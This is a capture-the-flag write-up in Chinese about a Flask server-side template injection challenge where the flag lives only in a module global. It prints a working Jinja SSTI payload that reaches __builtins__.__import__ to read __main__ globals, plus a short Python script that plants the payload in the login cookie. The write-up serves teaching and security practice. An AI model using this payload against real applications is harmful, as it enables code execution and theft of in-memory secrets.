# RCE won't help

## 题目简述

Flask 应用把用户 Cookie 直接嵌入 Jinja 模板源码：

```python
username = request.cookies.get("username")
return render_template_string(f"Welcome {username}!")
```

启动时，程序先把真实 Flag 存入模块全局变量 `flag`，随后将磁盘上的 `app.py` 中该字符串替换为 `greyhats{redacted}`。因此即使通过 SSTI 获得命令执行并读取文件，也只能看到删改后的源码；真正目标是读取仍驻留在 Python 进程内存中的全局变量。

## 解题过程

登录接口会把用户名原样写入 Cookie。提交下面的 Jinja 表达式：

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('__main__').flag }}
```

表达式沿 `self.__init__.__globals__` 取得函数全局命名空间，再从 `__builtins__` 调用 `__import__`，导入当前运行模块 `__main__` 并读取其 `flag` 属性。

```python
import requests

payload = "{{ self.__init__.__globals__.__builtins__.__import__('__main__').flag }}"
s = requests.Session()
s.post("http://HOST/login", data={"username": payload})
print(s.get("http://HOST/").text)
```

模板渲染结果为：

```text
greyhats{r34d1ng_G10B41S?!!}
```

## 方法总结

- 核心技巧：SSTI 后不读取已被覆盖的文件，而是导入主模块并访问进程内全局变量。
- 识别信号：Flag 先赋给模块变量，再改写源码文件；题目提示 RCE 无法直接找到 Flag。
- 复用要点：磁盘状态和进程内存状态可能不同；获得模板对象访问能力后，应检查模块全局、闭包和已加载对象。
